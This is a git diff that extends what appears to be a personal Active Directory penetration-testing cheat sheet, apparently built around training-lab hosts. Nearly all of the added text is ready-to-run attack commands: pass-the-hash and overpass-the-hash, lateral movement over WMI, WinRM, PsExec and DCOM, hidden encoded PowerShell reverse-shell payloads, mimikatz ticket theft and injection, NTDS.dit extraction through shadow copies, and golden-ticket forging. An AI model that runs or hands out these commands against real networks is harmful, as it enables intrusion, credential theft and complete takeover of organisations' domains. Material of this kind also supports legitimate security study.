@@ -314,6 +314,9 @@ Authenticates via SMB and notifies you if a valid user is a local admin by addin
 
 ``` bash
 crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+# using pass the hash 
+crackmapexec smb 192.168.50.75 -u paul -H '08d7a47a6f9f66b97b1bae4178747494' -d corp.com --continue-on-success
 ```
 </details>
 
@@ -332,10 +335,76 @@ Conducts password spraying against kerberos, only uses 2 UDP packets to identify
 Ports of interest
 
 - 22 - SSH
-- 135 - RPC
+- 135 - WMI (RPC) and DCOM
 - 139, 445 - SMB
 - 3389 - RDP
-- 5985, 5986 - WMI/WinRM
+- 5985, 5986 - WinRM
+
+<details>
+<summary>native WMI interaction</summary>
+
+``` bat
+rem using wmic (now depricated)
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+```
+
+``` powershell
+# using powershell
+$username = 'jen';
+
+$password = 'Nexus123!';
+
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+$options = New-CimSessionOption -Protocol DCOM
+
+$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+
+$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA...'; # base64 encoded powershell reverse shell
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+</details>
+
+<details>
+<summary>native WinRM interaction</summary>
+
+``` bat
+rem For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+```
+
+``` powershell
+# using powershell
+$username = 'jen';
+
+$password = 'Nexus123!';
+
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+
+Enter-PSSession 1
+
+whoami
+```
+</details>
+
+<details>
+<summary>psexec</summary>
+
+in order to use psexec, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on. the last two are default on modern Windows Server systems.
+
+``` bat
+.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
+
+</details>
 
 <details>
 <summary> impacket </summary>
@@ -346,6 +415,9 @@ mssqlclient.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10
 
 # connect to smb server
 smbclient.py domain.com/username:password@10.13.12.3
+
+# using pass the hash
+impacket-smbclient corp.com/dave@192.168.64.72 -hashes ':08d7a47a6f9f66b97b1bae4178747494'
 
 # execute code using the psexec service 
 psexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10
@@ -398,6 +470,10 @@ evil-winrm -i 10.13.10.3 -u "username" -p "password"
 ``` bash
 # rdp into a server ignoring any self signed certs
 xfreerdp /u:username /p:password /v:10.230.21.12 /cert:ignore /dynamic-resolution
+
+# using pass the hash 
+xfreerdp /u:username /pth:hash_goes_here /v:10.230.21.12 /d:corp.com /dynamic-resolution
+
 ```
 </details>
 
@@ -1114,8 +1190,51 @@ secretsdump.py -ntds ~/sam.hive -system ~/system -outputfile hashes.txt LOCAL
 <details>
 <summary> pass-the-hash (NTLM) </summary>
 
+PtH requires SMB (port 445) access, Windows File and Printer Sharing enabled, and the ADMIN$ share to be available. Attackers must have valid local admin credentials to move laterally.
+
 1. Obtain NT hashes from SAM or ntds.dit
-2. Use the hashes themselves (with SMB) as the password with tools like psexec 
+2. Use the hashes themselves to authenticate
+
+tools that support PTH:
+- PsExec from Metasploit
+- Passing-the-hash toolkit
+- Impacket
+
+example usage: 
+``` bash
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+```
+
+</details>
+
+<details>
+<summary>overpass the hash</summary>
+
+this technique essentially abuses an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).
+
+with a user's hash, we can start a powershell session as the user and obtain a TGT 
+``` bat
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+```
+
+This will spawn a new powershell session 
+
+```powershell
+# note running whoami will not show the new user, this is to be expected. Also, no TGT has been obtained yet
+klist
+
+# to get a TGT, authenticate to a network share
+net use \\files04
+
+# now, a TGT has been granted for the jen user
+klist
+```
+
+the official PsExec application cannot use password hashes, but with a valid Kerberos TGT, it can be reused for remote code execution on a target host.
+
+``` powershell
+.\PsExec.exe \\files04 cmd
+```
 </details>
 
 <details>
@@ -1201,8 +1320,7 @@ same thing using rubeus
 <summary> pass-the-ticket (kerberos) </summary>
 
 ``` bash
-# all we're doing here, is stealing a user's TGT and using it
-# on the compromised user's machine running mimikatz, list TGT ticket
+# all we're doing here, is stealing a user's TGT and using it on the compromised user's machine running mimikatz, list TGT ticket
 kerberos::tgt
 
 # export the TGT ticket
@@ -1214,6 +1332,36 @@ kerberos::ptt ticket.kirbi
 # now, in the same cmd prompt, you can authenticate to services as the compromised user
 psexec \\dc01 cmd.exe
 ```
+
+pulling tickets from memory:
+
+``` bash
+privilege::debug
+sekurlsa::tickets /export
+
+# inject the ticket 
+kerberos::ptt dave@cifs-web04.kirbi
+
+# confirm it got loaded 
+klist
+
+# use it
+ls \\web04\backup
+```
+
+</details>
+
+<details>
+<summary>DCOM</summary>
+
+Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.
+
+``` powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73")) # change target IP 
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7") # base64 encoded powershell reverse shell 
+```
+
 </details>
 
 ## Persistence
@@ -1497,6 +1645,27 @@ misc::skeleton
 </details>
 
 <details>
+<summary>volume shadow copy</summary>
+
+As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file.
+
+``` bat
+rem take note of the shadow copy device name.
+vshadow.exe -nw -p  C:
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
+rem we also need to grab the system hive 
+reg.exe save hklm\system c:\system.bak
+```
+
+``` bash
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
+
+</details>
+
+<details>
 <summary> extract ntds.dit oneliner </summary>
 
 ``` bat
@@ -1542,6 +1711,28 @@ export KRB5CCNAME=Administrator.ccache
 
 # use the ticket with impacket against a fileserver on the domain and run a command remotely
 wmiexec.py -k -no-pass -dc-ip 10.20.10.10 file01.domain.com hostname
+```
+</details>
+
+<details>
+<summary>golden ticket (using mimikatz)</summary>
+
+``` bash
+# dump ntds.dit on the domain controller to get the krbtgt hash and domain SID
+privilege::debug
+lsadump::lsa /patch
+
+# purge existsing tickets
+kerberos::purge
+
+# forge the ticket 
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+
+# open a cmd window with the golden ticket
+misc::cmd
+
+# now, psexec can be used with the golden ticket to authenticate
+PsExec.exe \\dc1 cmd.exe
 ```
 </details>
 
